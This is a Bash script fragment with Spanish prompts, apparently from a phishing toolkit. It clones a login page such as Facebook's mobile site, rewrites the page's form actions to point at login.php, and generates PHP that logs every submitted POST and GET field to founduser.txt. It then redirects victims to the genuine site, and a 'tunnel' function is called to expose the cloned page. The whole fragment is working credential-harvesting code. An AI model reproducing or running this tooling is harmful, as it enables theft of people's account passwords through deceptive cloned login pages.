# Nueva pagina
menu_nueva_pagina(){
	a2
        echo -e "$v[*]$b Algunas paginas como: facebook(version movil), twitter pueden no mostrar los datos correctamente\n"
        echo -e "$v[*]$b Recuerda que la url de algunas paginas no es la misma para todos los dispositivos"
        echo -e "$v[*]$b https://m.facebook.com > Version movil"
        echo -e "$v[*]$b https://www.facebook.com > Version escritorio\n"
	echo -e "$v[*]$b Escribe la URL de la pagina:\n"
	read -p ">> " url_pagina
	ruta_carpeta="clonadas"
	clonada="si"
	web=$url_pagina
	tunnel
}

fake(){
if [[ $add1 == "tt" || $add2 == "2" || $add3 == "3" || $add4 == "4" ]];then
	sed -i '1i <!--' index.html
	sed -i '2i -->' index.html
	sed -i '3i <head>' index.html
	sed -i '4i </head>' index.html
fi

if [[ $rede ]];then
	rede=$rede
else
	rede=$web
fi
ogrede=" header('Location: $rede');"
sed -i "/header('Location:.*)/d" ./login.php
sed -i '2i '"$ogrede"'' login.php
if [[ $clonada == "si" ]];then
        sed -i "/<?php/d" ./login.php
        sed -i '1i <?php' login.php
fi
}

change(){
 grep -o 'action=".*\"' index.html | cut -d '"' -f2 > name
 while  read -r line
 do
   IFS=$'\n'
   sed 's+'$line'+'login.php'+g' index.html > index.htmll
 done < name
}

mod_php(){
while  read -r line
 do
   IFS=$'\n'
        printf "\nif (!empty(\$_POST['%s'])) {" $line >> login.php
        printf "file_put_contents(\"founduser.txt\", \"%s: \"  . \$_POST['%s'] . \"\\n\", FILE_APPEND);" $line $line >> login.php
        printf "\n}" >>  login.php

        printf "\nif (!empty(\$_GET['%s'])) {" $line >> login.php
        printf "file_put_contents(\"founduser.txt\", \"%s: \"  . \$_GET['%s'] . \"\\n\", FILE_APPEND);" $line $line >> login.php
        printf "\n}" >>  login.php
 done < name.txt

}

descargar_pagina(){
echo -e "$v[*]$b Descargando sitio..."
python3 .get $url_pagina
if [[ ! -f index.html ]];then
        echo -e "$r[!]$b No se pudo descargar la pagina revisa tu conexión."
        exit 1
fi
echo -e "$v[*]$b Modificando archivos..."

python3 .bs4 $url_pagina > name.txt
if [[ $(cat name.txt) == "" ]] || [[ $(cat name.txt) == "Error" ]]; then
        echo -e "$r[!]$b Cuidado, inputs no encontrados"
fi
mod_php
change

if [[ -f index.htmll ]];then
        rm index.html
        mv index.htmll index.html
        rm name
        rm name.txt
else
        echo -e "$a[!]$b Formulario no encontrado"
fi
fake
}